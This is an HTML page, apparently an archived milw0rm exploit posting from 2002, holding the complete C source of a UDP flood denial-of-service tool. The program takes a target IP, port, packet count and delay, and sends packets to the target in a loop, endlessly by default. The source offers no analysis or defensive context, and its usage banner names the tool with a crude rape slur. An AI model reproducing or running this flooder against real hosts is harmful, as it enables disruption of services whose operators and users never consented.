<html><head><title>UDP Stress Tester Denial of Service Exploit</title></head><pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;time.h&gt;
#define shit &quot;BLEAHD&quot;

time_t elapsed;
long sendcount = 0, kbs;

void stats(int signum)
{
	kbs = (sendcount*6)/(time(0)-elapsed)/1024; // i dont think this is right but...
	printf(&quot;\npid: %d, ran for %u seconds\n&quot;,getpid(),(time(0) - elapsed));
	printf(&quot;%u packets out, total: %u Kb/s\n&quot;,sendcount,kbs);
	printf(&quot;aborting due to signal %d\n&quot;,signum);
	exit(32+signum);
}

void
usage(char *pname) {
 printf(&quot;raped.c by cys of NewNet\n&quot;);
 printf(&quot;Usage: %s dest[ip] x[0=flood] port[0=rand] delay(ms)[0=none]\n&quot;,pname);
 exit(-1);
}

int main(int argc, char **argv)
{
	struct sockaddr_in sin;
	int port, amount, i, s;
	elapsed = time(0);
	{int n;for (n=1;n&lt;32;n++) signal(n,stats);}
	if(argc &lt; 5)
		usage(argv[0]);
    
	if (atoi(argv[2]) != 0) { 
		amount = atoi(argv[2]); 
	} else { 
		amount = 0; 
	} 
 
	if(atoi(argv[3]) == 0)
	{
		srand((unsigned int)time(NULL));
		port = rand() % 65535;
	} else {
		if(atoi(argv[3]) &lt; 1 || atoi(argv[3]) &gt; 65535)
		{
			printf(&quot;Port must be over 1 and under 65535\n&quot;);
			exit(-1);
		} else {
			port = atoi(argv[3]);
		}
	}

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=inet_addr(argv[1]);
	sin.sin_port=htons(port);
	s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	connect(s,(struct sockaddr *)&amp;sin,sizeof(sin)); // connect in udp? il just leave it..
	printf(&quot;raped2.c by cys of NewNet\n&quot;);
	if(amount == 0) {
		printf(&quot;ip:%s x:0 port:%d delay:%d\n&quot;,argv[1],port,atoi(argv[4]));
		for(;;) {
			send(s,shit,50,0);
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	} else {
		printf(&quot;ip:%s x:%d port:%d delay:%d\n&quot;,argv[1],amount,port,atoi(argv[4]));
		for(i=0;i&lt;amount;i++){
			send(s,shit,50,0); 
			sendcount++;
			if(atoi(argv[4])!=0) usleep(atoi(argv[4]));
		}
	}
	printf(&quot;Exiting...\n&quot;);
}


// milw0rm.com [2002-09-10]</pre></html>